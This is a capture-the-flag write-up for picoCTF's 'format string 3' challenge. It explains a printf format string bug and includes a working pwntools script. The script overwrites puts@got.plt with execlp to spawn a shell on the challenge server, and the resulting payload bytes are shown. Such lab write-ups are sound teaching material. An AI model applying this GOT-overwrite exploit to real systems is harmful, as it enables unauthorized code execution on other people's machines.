# PicoCTF - format string 3

## Challenge Overview
**Title:** format string 3  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** format-string-3.c, format-string-3

## Description
This program doesn't contain a win function. How can you win? Download the binary here. Download the source here. Download libc here, download the interpreter here. Run the binary with these two files present in the same directory.

Additional details will be available after launching your challenge instance.

## Source Code
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}

```

## Initial Analysis
The binary is **dynamically** linked and is shipped with a custom libc and ld shared libraries.  
As the description says, there is **no** win function to give us the flag meaning we will have to obtain it in a **different** way.

We see a `hello()` function which prints the address `setvbuf` is mapped to at runtime.
```c
void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}
```
So we will probably have to **calculate** the address of a different function in libc.

We also find the format string **vulnerability**.
```c
fgets(buf, 1024, stdin);	
printf(buf);
```

What is **interesting** is a global string `normal_string` with the value **"/bin/sh"**.  
This hints to the need of launching a **shell**.
```c
char *normal_string = "/bin/sh";
```

The last line of `main` calls `puts` with the string as a **parameter**.

## Detailed Analysis
### Background Knowledge
Dynamically linked binaries **resolve** addresses of function in **shared** libraries (like libc) at runtime.  
During the **first** call to the function, the **linker** is invoked to find the **actual** address of the function and **fix** in the process's memory.

To do so, two sections are used, **Procedure Linkage Table (PLT)** and **Global Offset Table (GOT)**.  
For each function in a shared library, an entry is created for it in PLT and GOT.  
- GOT is **writable** and holds the address of the function, this is where the **linker** fixes the address.
- PLT simply performs an **indirect** jump to the address specified in the GOT.
Each **call** to a shared library function is **replaced** with a call to its entry in PLT.

`setvbuf` Example:
- `setvbuf@plt` and `setvbuf@got.plt` created in PLT and GOT respectively
- Calls to `setvbuf` replaced with call to `setvbuf@plt`
- Binary calls `setvbuf@plt`
- If it is the first call, linker finds address of `setvbuf` and fixes it in `setvbuf@got.plt`
- `setvbuf@plt` performs an indirect jump to the address stored is `setvbuf@got.plt`

What does this all mean?

A common function that **replaces** the process image with a different **binary**, taking only the path of the executable as a parameter is `execlp` inside libc.  
We can use this with the **"/bin/sh"** string to replace the process image with a shell.

How can we call `execlp` however?

The last line of in main calls `puts(normal_string)` and prints the **"/bin/sh"**.  
`puts` is a function in libc, meaning the above steps to resolve its address take place.  
We can **change** its entry, `puts@got.plt`, in GOT to the address of `execlp`.

Similarly to the previous challenge, **format string 2**,  we can change a value using the string format vulnerability.

What we need to do now, is find the **offset** of `execlp` to `setvbuf`, the address given to us, to be able to **calculate** its address when we launch the program.

Using `nm` we can see the **offset** of the function which will be **loaded** by the linker at runtime.

```
nm -D libc.so.6| grep ' setvbuf' 
000000000007a3f0 W setvbuf@@GLIBC_2.2.5

nm -D libc.so.6| grep ' execlp'
00000000000da830 T execlp@@GLIBC_2.2.5
```

Their **difference** is **0x60440**.

Now, I will use a **Python** script using `pwntools`, similar to the one in the previous challenge, to easily **construct** the payload.

### Script
```python
from pwn import *

exe = context.binary = ELF('./format-string-3', checksec=False)
target_addr = 0x404018
value_to_write = 0x60440

conn = remote('rhea.picoctf.net', 63152)

# Calculate argument offset
def find_offset():
   payload=b"AAAA"
   payload += b'%p.' * 38
   print(conn.recvline())
   print(conn.recvline())
   conn.sendline(payload)
   print(conn.recvline())

def get_address(line):
   tokens=line.split()
   last_token=tokens[-1]
   address=last_token
   return int(address,16)

def send_payload():
   global value_to_write
   
   offset = 38
   print(conn.recvline())
   line=conn.recvline()
   get_address(line)

   setvbuf_addr=get_address(line)
   value_to_write+=setvbuf_addr
   print(hex(value_to_write))
   payload = fmtstr_payload(offset, {target_addr: value_to_write},write_size='byte')
   print(payload)
   
   conn.sendline(payload)
   conn.interactive()
   

send_payload()
# find_offset()
```

First, we find the offset of the **stack arguments** where our input starts, using `find_offset()`, which is **38**.
Then, we find the address of the `puts@got.plt` entry in the program.  

I will do this using `gdb`.  
- I set a breakpoint at `puts@plt`
- Run the program
- Disassemble when it pauses

```
(gdb) b puts@plt
Breakpoint 1 at 0x401080
(gdb) r
Starting program: /home/george/Downloads/format-string-3 
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, 0x0000000000401080 in puts@plt ()
(gdb) disas
Dump of assembler code for function puts@plt:
=> 0x0000000000401080 <+0>:	endbr64
   0x0000000000401084 <+4>:	bnd jmp *0x2f8d(%rip)        # 0x404018 <puts@got.plt>
   0x000000000040108b <+11>:	nopl   0x0(%rax,%rax,1)
End of assembler dump.
```

We see the jump inside `puts@plt`, which `gdb` calculates and says it is **0x404018**.

With all this, our script is **ready**.  
It **extracts** the `setvbuf` address from the output, **increments** it by **0x60440** like we calculated, **crafts** the payload and **sends** it.  

Now we can **run** it

```
[+] Starting local process './format-string-3': pid 27426
b'Howdy gamers!\n'
0x7f7380741830
b'%48c%46$lln%67c%47$hhnc%48$hhn%11c%49$hhnc%50$hhn%152c%51$hhnaaa\x18@@\x00\x00\x00\x00\x00\x1c@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00\x1d@@\x00\x00\x00\x00\x00\x1b@@\x00\x00\x00\x00\x00\x19@@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
                                               c                                                                  \x8bc          \xf0c                                                                                                                                                       \x01aaa\x18@@$  
$ 
```

We have got our **shell**.

Now we `ls`, find the `flag.txt` and view it using `cat`

```
$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{____REDACTED____}
```
## Solution
- Use the above **script**
- Change the server name and port number accordingly.
- Run
- `cat flag.txt`

## Tools Used
- `pwntools`
- `gdb`